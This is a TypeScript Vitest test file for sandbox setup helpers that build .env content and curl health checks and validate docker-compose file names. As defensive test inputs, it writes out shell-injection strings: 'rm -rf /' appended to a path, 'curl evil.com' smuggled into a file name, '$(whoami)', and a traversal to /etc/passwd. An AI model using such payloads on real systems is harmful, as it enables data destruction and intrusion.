import { describe, it, expect, vi } from 'vitest';

// Mock crypto to avoid ENCRYPTION_KEY requirement at module load
vi.mock('../crypto.js', () => ({
  decrypt: vi.fn((v: string) => v),
}));

import { buildEnvFileContent, buildHealthCheckCommand, validateComposeFile } from './sandbox-setup.js';

describe('sandbox-setup helpers', () => {
  it('builds .env content from key-value pairs', () => {
    const content = buildEnvFileContent({
      DATABASE_URL: 'postgres://localhost/app',
      SECRET: 'has "quotes" and $vars',
    });
    expect(content).toContain('DATABASE_URL="postgres://localhost/app"');
    expect(content).toContain('SECRET="has \\"quotes\\" and \\$vars"');
  });

  it('builds health check curl command', () => {
    const cmd = buildHealthCheckCommand(3000, '/api/health');
    expect(cmd).toContain('curl');
    expect(cmd).toContain('3000');
    expect(cmd).toContain('/api/health');
  });

  it('defaults health path to /', () => {
    const cmd = buildHealthCheckCommand(3000);
    expect(cmd).toContain('localhost:3000/');
  });

  it('rejects invalid health paths', () => {
    expect(() => buildHealthCheckCommand(3000, '/path; rm -rf /')).toThrow('Invalid health path');
  });

  describe('validateComposeFile', () => {
    it('accepts valid compose file names', () => {
      expect(validateComposeFile('docker-compose.yml')).toBe(true);
      expect(validateComposeFile('docker-compose.dev.yml')).toBe(true);
      expect(validateComposeFile('docker-compose.dev.yaml')).toBe(true);
      expect(validateComposeFile('compose.yml')).toBe(true);
      expect(validateComposeFile('infra/docker-compose.yml')).toBe(true);
    });

    it('rejects compose file names with shell injection', () => {
      expect(validateComposeFile('foo.yml; curl evil.com')).toBe(false);
      expect(validateComposeFile('$(whoami).yml')).toBe(false);
      expect(validateComposeFile('file.txt')).toBe(false);
      expect(validateComposeFile('../../../etc/passwd')).toBe(false);
    });
  });
});
